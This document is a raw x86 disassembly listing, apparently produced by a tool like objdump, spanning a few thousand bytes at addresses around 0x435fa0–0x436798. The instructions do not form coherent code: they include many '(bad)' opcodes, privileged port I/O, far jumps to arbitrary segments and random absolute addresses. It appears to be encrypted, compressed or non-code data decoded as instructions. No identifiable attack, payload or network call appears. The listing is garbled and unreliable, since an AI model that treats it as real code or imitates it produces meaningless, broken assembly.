  435fa0:	and    cl,BYTE PTR [ecx-0xa]
  435fa3:	mov    eax,ds:0x84e4f812
  435fa8:	mov    ecx,0x458d717b
  435fad:	stos   DWORD PTR es:[edi],eax
  435fae:	push   ds
  435faf:	xor    dl,dl
  435fb1:	out    0xfd,eax
  435fb3:	sti    
  435fb4:	xchg   al,bh
  435fb6:	xchg   esi,eax
  435fb7:	dec    esp
  435fb8:	dec    ebp
  435fb9:	lahf   
  435fba:	je     0x435fbd
  435fbc:	sbb    DWORD PTR [ebp-0x73a9001c],0x8a0d74ce
  435fc6:	call   0x6100:0xeb4f124
  435fcd:	jg     0x435fb3
  435fcf:	(bad)  
  435fd0:	push   esi
  435fd1:	adc    DWORD PTR [edx+0x14419024],0x0
  435fd8:	nop
  435fd9:	leave  
  435fda:	pop    ds
  435fdb:	test   esp,ecx
  435fdd:	mov    ebp,0x524e
  435fe2:	add    BYTE PTR [eax],al
  435fe4:	add    BYTE PTR [eax],ch
  435fe6:	push   esp
  435fe7:	cmp    al,0xf9
  435fe9:	jg     0x1a3a16a9
  435fef:	str    WORD PTR ds:0x92482e85
  435ff6:	sbb    DWORD PTR [edi],ecx
  435ff8:	ret    0x1991
  435ffb:	push   eax
  435ffc:	inc    esi
  435ffd:	pop    ebp
  435ffe:	and    cl,BYTE PTR [eax+eax*1+0xd]
  436002:	lds    ebp,FWORD PTR [esi]
  436004:	xor    al,0xe8
  436006:	dec    ebp
  436007:	(bad)  
  436009:	iret   
  43600a:	(bad)
  43600e:	mov    bh,0xd5
  436010:	stc    
  436011:	or     eax,ebx
  436013:	retf   0x325b
  436016:	ins    BYTE PTR es:[edi],dx
  436017:	aad    0x86
  436019:	shr    DWORD PTR [edi-0x1e],cl
  43601c:	test   BYTE PTR [esi-0x60a1db8f],dl
  436022:	jae    0x43608d
  436024:	retf   0x3fa8
  436027:	jno    0x436022
  436029:	(bad)  
  43602a:	push   cs
  43602b:	iret   
  43602c:	pop    edx
  43602d:	jmp    0x435fc3
  43602f:	retf   
  436030:	pop    ebx
  436031:	push   edx
  436032:	add    BYTE PTR [edi],cl
  436034:	push   ebx
  436035:	or     edi,DWORD PTR [eax-0x7123136f]
  43603b:	and    edi,DWORD PTR [eax-0x7ae1be3d]
  436041:	(bad)  
  436043:	dec    eax
  436044:	dec    DWORD PTR [edx]
  436046:	adc    DWORD PTR [eax],esp
  436048:	push   ecx
  436049:	add    BYTE PTR [eax],al
  43604b:	add    BYTE PTR [eax],al
  43604d:	add    BYTE PTR [edx-0x7faf2a5c],al
  436053:	mov    ss,edx
  436055:	jae    0x436021
  436057:	mov    dl,0x60
  436059:	ss push eax
  43605b:	xor    al,0xee
  43605d:	add    edx,DWORD PTR [eax+0x6954f552]
  436063:	retf   
  436064:	xor    al,al
  436066:	mov    ds:0x84365ecc,eax
  43606b:	sbb    ah,BYTE PTR [ecx+0x700a0962]
  436071:	rcl    DWORD PTR [ebx],cl
  436073:	add    DWORD PTR [ecx],esp
  436075:	sbb    BYTE PTR ds:0x843662b2,dl
  43607b:	arpl   WORD PTR [esi+ecx*2-0x36d39f64],cx
  436082:	inc    eax
  436083:	mov    dh,0x72
  436085:	ret    
  436086:	arpl   WORD PTR [ebp-0x3a7bb16c],sp
  43608c:	xchg   DWORD PTR [ecx],esi
  43608e:	leave  
  43608f:	jg     0x43607e
  436091:	pop    ebp
  436092:	(bad)  
  436093:	push   0xffffff8d
  436095:	sar    BYTE PTR [ebx-0x27828bf7],1
  43609b:	cmp    eax,0x93c7db3b
  4360a0:	inc    esp
  4360a1:	enter  0x6849,0x6f
  4360a5:	les    eax,FWORD PTR [ebp-0x5]
  4360a8:	ss sti 
  4360aa:	xchg   edi,eax
  4360ab:	pop    esi
  4360ac:	pusha  
  4360ad:	xlat   BYTE PTR ds:[ebx]
  4360ae:	or     eax,0x84c917
  4360b3:	add    BYTE PTR [eax],al
  4360b5:	add    BYTE PTR [eax],al
  4360b7:	repz push es
  4360b9:	cmc    
  4360ba:	xor    al,0xb
  4360bc:	outs   dx,DWORD PTR ds:[esi]
  4360bd:	or     eax,0xe17f7934
  4360c2:	jbe    0x436087
  4360c4:	or     dh,BYTE PTR [edx+0x36]
  4360c7:	sbb    dl,BYTE PTR fs:[ecx+0x7a095ff3]
  4360ce:	ret    
  4360cf:	fsubr  QWORD PTR [esi+0x7c35c3a7]
  4360d5:	push   cs
  4360d6:	bound  eax,QWORD PTR [esi+0x57a4370a]
  4360dc:	xchg   DWORD PTR [ecx-0x2b],esi
  4360df:	mov    WORD PTR [edi-0x66b2a8f],es
  4360e5:	in     eax,0x39
  4360e7:	dec    edi
  4360e8:	test   edx,ebp
  4360ea:	pop    esp
  4360eb:	pop    ecx
  4360ec:	push   ss
  4360ed:	idiv   BYTE PTR [eax]
  4360ef:	or     cl,BYTE PTR [ebx+ebp*8]
  4360f2:	jb     0x4360bd
  4360f4:	push   es
  4360f5:	cwde   
  4360f6:	xchg   ecx,eax
  4360f7:	in     al,0x34
  4360f9:	ins    DWORD PTR es:[edi],dx
  4360fa:	scas   al,BYTE PTR es:[edi]
  4360fb:	xlat   BYTE PTR ds:[ebx]
  4360fc:	sub    eax,0x9e61dc7
  436101:	popa   
  436102:	xchg   ebp,eax
  436103:	imul   esp,DWORD PTR [ebp+0x1a],0xffffff96
  436107:	inc    ecx
  436108:	push   ss
  436109:	xchg   edi,eax
  43610a:	sbb    al,0xdc
  43610c:	or     DWORD PTR [ecx-0x27],esp
  43610f:	mov    ebx,0xd77ee987
  436114:	das    
  436115:	(bad)  
  436116:	bound  ecx,QWORD PTR [ecx+0xaf616]
  43611c:	add    BYTE PTR [eax],al
  43611e:	add    BYTE PTR [eax],al
  436120:	xor    eax,0xd373eb0b
  436125:	pop    esi
  436126:	aad    0x2a
  436128:	popa   
  436129:	das    
  43612a:	cli    
  43612b:	push   0xffffffc8
  43612d:	mov    eax,ds:0x2f6eb73f
  436132:	loopne 0x4360cc
  436134:	sbb    BYTE PTR [ebp-0x1e],ah
  436137:	jb     0x436196
  436139:	fld    st(7)
  43613b:	inc    ecx
  43613c:	aaa    
  43613d:	loope  0x436129
  43613f:	cs adc bl,dh
  436142:	popa   
  436143:	retf   
  436144:	dec    esi
  436145:	test   dh,ah
  436147:	fs pop esi
  436149:	or     ah,BYTE PTR [ecx+0x1d]
  43614c:	pop    edi
  43614d:	je     0x436132
  43614f:	push   cs
  436150:	sar    DWORD PTR [edx+0x6c770097],0xec
  436157:	pop    eax
  436158:	mov    eax,ds:0x3effe7af
  43615d:	lea    edx,[edi-0xc]
  436160:	mov    bl,0x56
  436162:	mul    BYTE PTR [eax]
  436164:	enter  0xe4ef,0x5f
  436168:	outs   dx,DWORD PTR ds:[esi]
  436169:	mov    WORD PTR [ecx+0x11f1f05b],gs
  43616f:	add    BYTE PTR [ebx+ecx*4-0x6],ah
  436173:	cmp    DWORD PTR ds:0xf9000f18,0x42f08f8a
  43617d:	icebp  
  43617e:	in     al,0x53
  436180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436181:	xlat   BYTE PTR ds:[ebx]
  436182:	ds push 0x0
  436188:	add    BYTE PTR [edi],dl
  43618a:	mov    ah,0xe
  43618c:	add    BYTE PTR [edx-0x7],ah
  43618f:	nop
  436190:	icebp  
  436191:	retf   0xe55c
  436194:	adc    eax,0x2b04b1
  436199:	mov    eax,ds:0xb900dfb9
  43619e:	mov    bl,0x5d
  4361a0:	pop    ebx
  4361a1:	sub    al,0x32
  4361a3:	out    0xfd,al
  4361a5:	cs lock cmp eax,0xaf4fe153
  4361ac:	inc    eax
  4361ad:	mov    ecx,0x42f08f8a
  4361b2:	lock in al,0x50
  4361b5:	dec    esi
  4361b6:	add    dh,BYTE PTR [ebx]
  4361b8:	adc    ch,cl
  4361ba:	mov    bl,0x8f
  4361bc:	rol    BYTE PTR [ebp-0x46],0x97
  4361c0:	(bad)  
  4361c1:	sar    edx,0xe4
  4361c4:	call   ecx
  4361c6:	mov    ds:0x87aeffc4,al
  4361cb:	into   
  4361cc:	je     0x43622d
  4361ce:	mov    esi,0xa1909597
  4361d3:	(bad)  
  4361d4:	stc    
  4361d5:	pop    edi
  4361d6:	xchg   esp,eax
  4361d7:	mov    eax,ds:0xd6d922e8
  4361dc:	stc    
  4361dd:	adc    al,0xd9
  4361df:	pop    ebx
  4361e0:	sbb    al,0x1b
  4361e2:	daa    
  4361e3:	jmp    0x436235
  4361e5:	or     eax,0x37fbd766
  4361ea:	adc    dl,cl
  4361ec:	cmp    DWORD PTR [eax],eax
  4361ee:	add    BYTE PTR [eax],al
  4361f0:	add    BYTE PTR [eax],al
  4361f2:	das    
  4361f3:	call   0xe158edc8
  4361f8:	sar    cl,cl
  4361fa:	pop    ds
  4361fb:	xchg   ebx,eax
  4361fc:	mov    edx,0xd15393e8
  436201:	stc    
  436202:	outs   dx,DWORD PTR ds:[esi]
  436203:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436204:	push   0xcd526bbd
  436209:	jg     0x4361f7
  43620b:	lods   al,BYTE PTR ds:[esi]
  43620c:	adc    BYTE PTR [eax],al
  43620e:	nop
  43620f:	int3   
  436210:	cmp    edx,DWORD PTR [edx+0x47]
  436213:	test   BYTE PTR [edi-0x2e09fc18],dh
  436219:	stc    
  43621a:	mov    ds:0x38fd484b,eax
  43621f:	mov    BYTE PTR [edi+0x5b18ba7d],bh
  436225:	add    eax,0x65eb055a
  43622a:	xchg   esi,eax
  43622b:	xor    al,0xec
  43622d:	mov    WORD PTR gs:[eax+edx*1+0x66],fs
  436232:	xchg   edx,eax
  436233:	inc    edi
  436234:	and    BYTE PTR [edi+0x41],cl
  436237:	dec    edx
  436238:	fs push esp
  43623a:	je     0x436243
  43623c:	inc    dh
  43623e:	test   al,0xc
  436240:	or     ecx,edi
  436242:	pop    DWORD PTR [edi+0x1bcc6a7e]
  436248:	inc    ebp
  436249:	sub    bl,al
  43624b:	in     eax,dx
  43624c:	addr16 inc esp
  43624e:	lods   al,BYTE PTR ds:[esi]
  43624f:	mov    dl,0x11
  436251:	ja     0x436227
  436253:	into   
  436254:	mov    ebp,0x33
  436259:	add    BYTE PTR [eax],al
  43625b:	xlat   BYTE PTR ds:[ebx]
  43625c:	arpl   WORD PTR [eax-0x42],si
  43625f:	mov    esi,DWORD PTR [edx+0x628c03f5]
  436265:	bound  eax,QWORD PTR [eax+0x74]
  436268:	(bad)  
  436269:	test   DWORD PTR [eax+0x63],edi
  43626c:	ret    0xdc2e
  43626f:	ins    DWORD PTR es:[edi],dx
  436270:	inc    ebx
  436271:	cli    
  436272:	les    ecx,FWORD PTR ds:0xa3c47a0b
  436278:	scas   al,BYTE PTR es:[edi]
  436279:	pop    es
  43627a:	les    ebp,FWORD PTR ds:0x8cd778c1
  436280:	aaa    
  436281:	and    DWORD PTR [eax],esp
  436283:	jo     0x4362be
  436285:	mov    ds:0xabea7cdb,al
  43628a:	les    ecx,FWORD PTR [ebx+esi*8]
  43628d:	sub    edx,esi
  43628f:	jne    0x43624b
  436291:	dec    edx
  436292:	aas    
  436293:	lods   al,BYTE PTR ds:[esi]
  436294:	stos   BYTE PTR es:[edi],al
  436295:	inc    DWORD PTR [ebx]
  436297:	inc    eax
  436298:	add    eax,0x728263e2
  43629d:	cmc    
  43629e:	adc    ah,0xb6
  4362a1:	and    esi,DWORD PTR [edi+0x4c]
  4362a4:	into   
  4362a5:	in     eax,dx
  4362a6:	xor    esp,DWORD PTR [ecx+0x39]
  4362a9:	mov    al,ds:0x6309cadb
  4362ae:	les    ebx,FWORD PTR [ecx+0x64]
  4362b1:	sbb    ch,BYTE PTR [ecx]
  4362b3:	aaa    
  4362b4:	out    dx,al
  4362b5:	sbb    BYTE PTR [edx],al
  4362b7:	nop
  4362b8:	mov    dl,0x38
  4362ba:	xor    BYTE PTR [edx+0x39],al
  4362bd:	inc    esi
  4362be:	les    eax,FWORD PTR [eax]
  4362c0:	add    BYTE PTR [eax],al
  4362c2:	add    BYTE PTR [eax],al
  4362c4:	or     DWORD PTR [esi],0xffffffe7
  4362c7:	inc    ebx
  4362c8:	nop
  4362c9:	cmp    DWORD PTR ds:0x2caeda78,ebp
  4362cf:	push   cs
  4362d0:	mov    eax,0x93ad0e81
  4362d5:	das    
  4362d6:	std    
  4362d7:	sub    eax,0xfcebaec1
  4362dc:	dec    edi
  4362dd:	mov    ah,0x4e
  4362df:	jmp    0xaf6aaa6c
  4362e4:	addr16 xchg esi,eax
  4362e6:	add    al,0xe
  4362e8:	lds    edi,FWORD PTR [edx-0x68544315]
  4362ee:	push   edx
  4362ef:	jmp    0xda460440
  4362f4:	shl    DWORD PTR [edx-0x4d6d14d7],cl
  4362fa:	push   cs
  4362fb:	pop    ebp
  4362fc:	inc    ebx
  4362fd:	push   0x2fcaaa47
  436302:	frstor [edx-0x3e]
  436305:	scas   al,BYTE PTR es:[edi]
  436306:	shl    edi,cl
  436308:	out    dx,eax
  436309:	push   eax
  43630a:	dec    esi
  43630b:	jmp    0xe7a55028
  436310:	push   ss
  436311:	add    eax,0xa1d2e875
  436316:	in     al,0x25
  436318:	call   0x9af170c9
  43631d:	ret    0x2998
  436320:	mov    WORD PTR [esi+0x13],?
  436323:	(bad)  
  436325:	sbb    DWORD PTR [edx+0x2e],esp
  436328:	add    BYTE PTR [eax],al
  43632a:	add    BYTE PTR [eax],al
  43632c:	add    bl,dl
  43632e:	or     dl,BYTE PTR [edi+0x124432af]
  436334:	jmp    0x1a717947
  436339:	pop    ecx
  43633a:	pusha  
  43633b:	xchg   edi,eax
  43633c:	cmc    
  43633d:	scas   eax,DWORD PTR es:[edi]
  43633e:	aam    0x43
  436340:	jb     0x43630f
  436342:	(bad)  
  436343:	aad    0xb8
  436345:	add    BYTE PTR [eax+0x56],dh
  436348:	sbb    dl,bl
  43634a:	(bad)  
  43634b:	and    eax,0x1c056611
  436350:	add    BYTE PTR ds:0x331673ef,bh
  436356:	and    ebx,DWORD PTR [edx+0x24]
  436359:	mov    DWORD PTR [ebx],esi
  43635b:	cmc    
  43635c:	mov    DWORD PTR ds:0xd7e8030c,ebp
  436362:	sbb    ah,dh
  436364:	jmp    edx
  436366:	loopne 0x43635d
  436368:	js     0x4363bb
  43636a:	icebp  
  43636b:	in     al,0x66
  43636d:	jmp    0x7835:0x47721646
  436374:	adc    BYTE PTR [ecx+eax*2+0x3fb2045f],ch
  43637b:	icebp  
  43637c:	add    ebp,DWORD PTR [edx+0x3a8b39f9]
  436382:	xor    eax,0xb03890a6
  436387:	push   cs
  436388:	lea    edi,[esi+0x1cff3d16]
  43638e:	inc    eax
  43638f:	sbb    al,0x40
  436391:	add    BYTE PTR [eax],al
  436393:	add    BYTE PTR [eax],al
  436395:	add    cl,bh
  436397:	xor    al,0x4d
  436399:	or     BYTE PTR [eax+0x721c326b],al
  43639f:	js     0x4363a7
  4363a1:	push   esi
  4363a2:	jo     0x43640f
  4363a4:	xor    bl,BYTE PTR [esi+esi*1]
  4363a7:	stos   DWORD PTR es:[edi],eax
  4363a8:	not    BYTE PTR [edx]
  4363aa:	mov    ecx,0xcd4c91ae
  4363af:	lahf   
  4363b0:	adc    eax,0x5677e8b7
  4363b5:	je     0x4363a4
  4363b7:	sub    al,0xf6
  4363b9:	adc    eax,0xc039abbd
  4363be:	adc    bl,BYTE PTR [ecx+edx*4-0x71cc70fd]
  4363c5:	push   ds
  4363c6:	mov    eax,0xa0eb0eaf
  4363cb:	xor    al,0xe9
  4363cd:	gs nop
  4363cf:	nop
  4363d0:	(bad)  
  4363d1:	sbb    al,0x91
  4363d3:	sbb    DWORD PTR [edi],ecx
  4363d5:	test   DWORD PTR [esi+esi*4],ecx
  4363d8:	out    0x2c,al
  4363da:	bound  esi,QWORD PTR [edx-0x6d09efb9]
  4363e0:	push   ebx
  4363e1:	and    al,0xb0
  4363e3:	sub    bh,BYTE PTR [esi+0x71]
  4363e6:	xchg   BYTE PTR [eax-0x2833f62b],al
  4363ec:	cmp    DWORD PTR [edx],edx
  4363ee:	or     eax,0xc21ff345
  4363f3:	dec    edx
  4363f4:	xchg   esp,eax
  4363f5:	rcl    BYTE PTR [ecx+ebp*1+0xff61],0x0
  4363fd:	add    BYTE PTR [eax],al
  4363ff:	das    
  436400:	out    dx,eax
  436401:	xchg   ebx,eax
  436402:	stc    
  436403:	aas    
  436404:	xchg   edx,eax
  436405:	push   ebx
  436406:	and    al,0x9c
  436408:	mov    cs,edi
  43640a:	jae    0x4363a0
  43640c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43640d:	shl    ch,cl
  43640f:	rol    BYTE PTR [eax-0x2cd7afe7],1
  436415:	pop    ecx
  436416:	stc    
  436417:	pop    ss
  436418:	nop
  436419:	ds and al,0xa4
  43641c:	adc    DWORD PTR [esi+0x24],0xdbf6e1bc
  436423:	(bad)  
  436424:	cmp    edx,DWORD PTR [ebx-0x57478315]
  43642a:	inc    ebx
  43642b:	nop
  43642c:	sbb    ah,BYTE PTR [ebx]
  43642e:	sbb    ebx,DWORD PTR [ebx]
  436430:	add    dl,ah
  436432:	mov    edi,0x8502d499
  436437:	or     DWORD PTR [ecx-0x36ffff1],edx
  43643d:	push   edx
  43643e:	lock adc ecx,DWORD PTR [ebx+0xa]
  436442:	push   edx
  436443:	mov    edi,0xa813f304
  436448:	(bad)  
  436449:	xor    ecx,edi
  43644b:	scas   eax,DWORD PTR es:[edi]
  43644c:	mov    cl,0x5f
  43644e:	dec    eax
  43644f:	ins    BYTE PTR es:[edi],dx
  436450:	mov    esi,0x673b61ac
  436455:	js     0x43641f
  436457:	jo     0x436449
  436459:	lock add ecx,DWORD PTR [edi]
  43645c:	andnps xmm0,XMMWORD PTR [ebx]
  43645f:	nop
  436460:	mov    dl,0x88
  436462:	push   esi
  436463:	add    BYTE PTR [eax],al
  436465:	add    BYTE PTR [eax],al
  436467:	add    BYTE PTR ds:0x77b0194f,dl
  43646d:	add    dh,ch
  43646f:	pop    ecx
  436470:	pop    ss
  436471:	outs   dx,DWORD PTR ds:[esi]
  436472:	fstp   DWORD PTR [ebx]
  436474:	shr    DWORD PTR ds:0xd9e7ac3a,0x4
  43647b:	shl    edx,0x35
  43647e:	std    
  43647f:	pop    ds
  436480:	mov    ebp,0x2fc3a7b9
  436485:	fincstp 
  436487:	add    edx,DWORD PTR [eax+0x399cb30a]
  43648d:	add    dh,BYTE PTR [eax-0x44]
  436490:	jge    0x43646f
  436492:	jns    0x436454
  436494:	mov    ds:0x67cb0877,eax
  436499:	pop    edi
  43649a:	in     eax,0x8e
  43649c:	shr    DWORD PTR [eax+0x304f47cc],cl
  4364a2:	and    cl,BYTE PTR [ebp+esi*4-0x1c]
  4364a6:	push   edx
  4364a7:	sti    
  4364a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4364a9:	mov    cl,0x39
  4364ab:	into   
  4364ac:	inc    edi
  4364ad:	or     BYTE PTR gs:[ebx+0x6d],dl
  4364b1:	repnz clc 
  4364b3:	push   ebx
  4364b4:	ss mov dh,0x7d
  4364b7:	mov    bl,BYTE PTR [esi+0x1]
  4364ba:	test   BYTE PTR [eax+eiz*8+0xf378337],cl
  4364c1:	cs and eax,ebp
  4364c4:	stos   DWORD PTR es:[edi],eax
  4364c5:	push   0x29a80a60
  4364ca:	push   cs
  4364cb:	and    eax,DWORD PTR [eax]
  4364cd:	add    BYTE PTR [eax],al
  4364cf:	add    BYTE PTR [eax],al
  4364d1:	sar    ebx,1
  4364d3:	xchg   esi,eax
  4364d4:	lahf   
  4364d5:	sbb    eax,0xc4e7f5db
  4364da:	cld    
  4364db:	jmp    0x4e9:0xeb01c550
  4364e2:	jbe    0x4364e2
  4364e4:	arpl   WORD PTR [ebx-0x7b],dx
  4364e7:	adc    al,0x70
  4364e9:	out    0xd6,eax
  4364eb:	cs push edx
  4364ed:	mov    BYTE PTR [edi-0x32],bh
  4364f0:	add    eax,0x932760b
  4364f5:	sbb    eax,0x922b763f
  4364fa:	mov    dl,0xe
  4364fc:	jo     0x4364d5
  4364fe:	(bad)  
  4364ff:	add    ah,BYTE PTR [eax-0x31]
  436502:	(bad)  
  436503:	or     bl,BYTE PTR [edi+edx*8-0x2a]
  436507:	cmp    bl,BYTE PTR [edx-0x3ab5c61d]
  43650d:	xor    edi,edx
  43650f:	add    BYTE PTR [ecx+0x620e7299],cl
  436515:	push   0x80ad8fb6
  43651a:	ins    BYTE PTR es:[edi],dx
  43651b:	inc    di
  43651d:	or     ecx,DWORD PTR [edi+esi*2]
  436520:	les    edx,FWORD PTR [esi+esi*1]
  436523:	leave  
  436524:	(bad)  
  436525:	(bad)  
  436526:	std    
  436527:	imul   DWORD PTR [ecx+0x51]
  43652a:	ret    
  43652b:	push   cs
  43652c:	xor    al,0x56
  43652e:	sub    eax,0xd52be159
  436533:	mov    al,0xae
  436535:	add    BYTE PTR [eax],al
  436537:	add    BYTE PTR [eax],al
  436539:	add    BYTE PTR [edi],ch
  43653b:	ss into 
  43653d:	sbb    al,0xea
  43653f:	jge    0x4365ab
  436541:	lds    eax,FWORD PTR [ebx-0x17da6648]
  436547:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436548:	pop    edi
  436549:	sti    
  43654a:	jns    0x43654d
  43654c:	inc    edx
  43654d:	add    BYTE PTR [ecx],ah
  43654f:	aam    0x87
  436551:	(bad)  
  436552:	ds sub eax,0x2de12452
  436558:	push   edx
  436559:	and    al,0xc9
  43655b:	dec    ebx
  43655c:	pop    es
  43655d:	inc    ebp
  43655f:	sbb    BYTE PTR [ebx],cl
  436561:	(bad)  
  436562:	hlt    
  436563:	lods   al,BYTE PTR ds:[esi]
  436564:	ds call 0x288689
  43656a:	hlt    
  43656b:	mul    BYTE PTR [ebp+0xc]
  43656e:	sub    BYTE PTR [ebx+0x3e],bl
  436571:	lea    ebp,ds:0x77e80b18
  436577:	push   ds
  436578:	in     eax,0xff
  43657a:	cli    
  43657b:	dec    ebx
  43657c:	es dec esi
  43657e:	xor    BYTE PTR [edx+0x4855ac91],cl
  436584:	jmp    0x436585
  436586:	imul   eax,DWORD PTR ds:0x4c6e8bc2,0x3f8e5d3b
  436590:	xchg   ecx,eax
  436591:	iret   
  436592:	mov    eax,ds:0x3eff480c
  436597:	sub    eax,0x2b492442
  43659c:	fmul   QWORD PTR [edi]
  43659e:	add    BYTE PTR [eax],al
  4365a0:	add    BYTE PTR [eax],al
  4365a2:	add    BYTE PTR [edi+0x29000df5],bl
  4365a8:	sub    eax,0x2315246a
  4365ad:	bound  esp,QWORD PTR [eax+edi*4]
  4365b0:	xor    ecx,ebp
  4365b2:	aaa    
  4365b3:	or     BYTE PTR [ecx+0x74],0x2d
  4365b7:	ins    BYTE PTR es:[edi],dx
  4365b8:	jne    0x4365a7
  4365ba:	push   ebx
  4365bb:	cdq    
  4365bc:	aas    
  4365bd:	call   FWORD PTR [edi-0x39]
  4365c0:	jae    0x4365d0
  4365c2:	xor    DWORD PTR ds:0x184797b0,0xffffffca
  4365c9:	add    dl,BYTE PTR [eax-0x70]
  4365cc:	xchg   esi,eax
  4365cd:	push   ecx
  4365ce:	call   0x5c499633
  4365d3:	sahf   
  4365d4:	leave  
  4365d5:	adc    bh,BYTE PTR [ebp-0x2c]
  4365d8:	or     eax,0xff90398f
  4365dd:	adc    al,BYTE PTR [eax+0x6212385e]
  4365e3:	imul   edi,eax,0xe37a74b9
  4365e9:	adc    cl,BYTE PTR [ebx-0x74c091b1]
  4365ef:	(bad)  
  4365f0:	ins    DWORD PTR es:[edi],dx
  4365f1:	aas    
  4365f2:	stc    
  4365f3:	popf   
  4365f4:	push   ebp
  4365f5:	add    DWORD PTR [eax-0x70],eax
  4365f8:	not    DWORD PTR [edi-0x2c7396bf]
  4365fe:	or     al,0xf6
  436600:	xchg   edx,eax
  436601:	adc    DWORD PTR [edx-0x57],esp
  436604:	clc    
  436605:	int    0x74
  436607:	add    BYTE PTR [eax],al
  436609:	add    BYTE PTR [eax],al
  43660b:	add    BYTE PTR [edi+0x23],bh
  43660e:	dec    DWORD PTR [edx-0x74c04931]
  436614:	(bad)  
  436615:	or     edi,DWORD PTR [edi]
  436617:	stc    
  436618:	popf   
  436619:	push   ebp
  43661a:	add    DWORD PTR [eax-0x70],eax
  43661d:	aaa    
  43661e:	cwde   
  43661f:	inc    ecx
  436620:	xor    eax,0x100cd38c
  436625:	pop    ds
  436626:	mov    ah,0xfe
  436628:	lods   eax,DWORD PTR ds:[esi]
  436629:	adc    BYTE PTR [esi+ecx*1-0x4a],0xd2
  43662e:	or     al,0x73
  436630:	xchg   BYTE PTR [edx+0x1579ff38],bh
  436636:	pushf  
  436637:	dec    edx
  436638:	add    al,0xd3
  43663a:	mov    edx,0xa940b22c
  43663f:	repnz dec esi
  436641:	lock (bad) 
  436644:	xchg   DWORD PTR [edx-0x4d8600c8],ebx
  43664a:	in     eax,0x8e
  43664c:	dec    edx
  43664d:	mov    ah,0x4f
  43664f:	lods   al,BYTE PTR ds:[esi]
  436650:	js     0x436626
  436652:	test   BYTE PTR [ebp-0x4329d148],bh
  436658:	leave  
  436659:	xchg   edi,eax
  43665a:	pop    esi
  43665b:	inc    esi
  43665c:	mov    ?,WORD PTR [ebx]
  43665e:	mov    bl,0xef
  436660:	xor    al,0xf7
  436662:	pushf  
  436663:	dec    esi
  436664:	cdq    
  436665:	xor    eax,0xfea9bd07
  43666a:	pop    edi
  43666b:	jo     0x4366e1
  43666d:	push   es
  43666e:	test   BYTE PTR [ebx],0x0
  436671:	add    BYTE PTR [eax],al
  436673:	add    BYTE PTR [eax],al
  436675:	nop
  436676:	sub    ebp,DWORD PTR [ecx+0x2ec19fe7]
  43667c:	sti    
  43667d:	jmp    0xb1ad:0xa24762a2
  436684:	ret    0x700b
  436687:	lods   eax,DWORD PTR ds:[esi]
  436688:	lock popa 
  43668a:	xchg   ebp,eax
  43668b:	ficomp WORD PTR [edx]
  43668d:	cdq    
  43668e:	jbe    0x4366b3
  436690:	sub    DWORD PTR [esi-0x30],ecx
  436693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436694:	push   ecx
  436695:	or     esp,DWORD PTR [edi-0x27]
  436698:	repz frstor [ebx+0x78]
  43669c:	les    ecx,FWORD PTR [edx+eiz*2+0x3a280127]
  4366a3:	jne    0x436662
  4366a5:	cmp    DWORD PTR [edx],ebp
  4366a7:	in     eax,0x86
  4366a9:	and    al,BYTE PTR [edi-0x292b773e]
  4366af:	adc    DWORD PTR [esi+0x15],edx
  4366b2:	lods   al,BYTE PTR ds:[esi]
  4366b3:	mov    ebp,0xc3fdc8ca
  4366b8:	mov    dl,bl
  4366ba:	sub    BYTE PTR [ebp-0x2d23bf55],bl
  4366c0:	mov    esp,0x18116f15
  4366c5:	call   0x2d587574
  4366ca:	cld    
  4366cb:	xchg   edi,eax
  4366cc:	stos   BYTE PTR es:[edi],al
  4366cd:	inc    esp
  4366ce:	pop    eax
  4366cf:	dec    ecx
  4366d0:	inc    edx
  4366d1:	adc    esi,edi
  4366d3:	in     eax,dx
  4366d4:	call   0xee14196c
  4366d9:	add    BYTE PTR [eax],al
  4366db:	add    BYTE PTR [eax],al
  4366dd:	add    BYTE PTR [ebx-0x47ca6893],dl
  4366e3:	mov    ch,0x44
  4366e5:	mov    edx,0xd960c605
  4366ea:	push   es
  4366eb:	mov    ebp,0xf057e604
  4366f0:	sbb    dh,BYTE PTR [edi]
  4366f2:	push   ebx
  4366f3:	push   DWORD PTR [edi]
  4366f5:	das    
  4366f6:	addr16 leave 
  4366f8:	push   esi
  4366f9:	mov    cl,0x5f
  4366fb:	popf   
  4366fc:	push   esi
  4366fd:	mov    eax,ds:0xa156a5c7
  436702:	mov    edi,0x6f518fb1
  436707:	cmp    dh,0x71
  43670a:	xchg   edx,eax
  43670b:	ins    BYTE PTR es:[edi],dx
  43670c:	xchg   edi,eax
  43670d:	popa   
  43670e:	sbb    edi,ebp
  436710:	jmp    0x1c26:0x6d503be9
  436717:	pop    ss
  436718:	add    bl,bl
  43671a:	push   ebx
  43671b:	pop    ss
  43671c:	sbb    al,0xbb
  43671e:	sti    
  43671f:	xchg   ecx,eax
  436720:	jmp    0x145a6b33
  436725:	fwait
  436726:	jmp    0x4366e2
  436728:	jmp    0x972b:0x4557fbfe
  43672f:	mov    dl,0x41
  436731:	(bad)  
  436732:	idiv   DWORD PTR [edx+edi*8-0x4b]
  436736:	xchg   ebp,eax
  436737:	mov    dl,0xe
  436739:	aaa    
  43673a:	pop    es
  43673b:	adc    DWORD PTR [esi],0x97051f3e
  436741:	out    0x0,al
  436743:	add    BYTE PTR [eax],al
  436745:	add    BYTE PTR [eax],al
  436747:	dec    edx
  436748:	inc    edx
  436749:	mov    al,BYTE PTR [eax]
  43674b:	call   0xacd07600
  436750:	inc    edx
  436751:	pop    ebx
  436752:	push   0xfffffffc
  436754:	pusha  
  436755:	xchg   ecx,eax
  436756:	into   
  436757:	ror    ebx,1
  436759:	cwde   
  43675a:	push   DWORD PTR [esi]
  43675c:	xor    cl,dh
  43675e:	(bad)  
  436760:	test   bl,ch
  436762:	(bad)  
  436763:	mov    ecx,0x6c8d12ce
  436768:	inc    edx
  436769:	jbe    0x4367e3
  43676b:	inc    esi
  43676c:	jbe    0x43677c
  43676e:	push   eax
  43676f:	mov    ss:0xb6791672,eax
  436775:	imul   eax,esp,0xfce31c5
  43677b:	sub    eax,0xa9ffeb6e
  436780:	into   
  436781:	jge    0x80b9b3c3
  436787:	out    0x76,al
  436789:	push   cs
  43678a:	push   eax
  43678b:	(bad)  
  43678c:	mov    eax,ds:0xb0291672
  436791:	imul   eax,esp,0xfce3375
  436797:	in     eax,dx
  436798:	or     ch,ah
